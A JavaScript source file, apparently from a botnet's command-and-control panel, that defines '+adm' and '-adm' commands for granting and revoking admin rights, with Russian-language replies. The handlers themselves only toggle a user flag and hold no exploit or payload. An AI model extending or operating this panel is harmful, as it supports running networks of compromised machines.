const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^\+adm (.*)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(user.admin) {
        return client.write(center(`${username} уже является администратором.`.red.italic, client.getWidth()) + '\n\n')
    }

    user.admin = true
    client.write(center(`${username} теперь администратор.`.bgGreen.brightWhite, client.getWidth()) + '\n\n')
})

CommandsCore.cmdInit(/^\-adm (.*)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.admin) {
        return client.write(center(`${username} не администратор.`.red.italic, client.getWidth()) + '\n\n')
    }

    user.admin = false
    client.write(center(`${username} больше не администратор.`.bgRed.brightWhite, client.getWidth()) + '\n\n')
})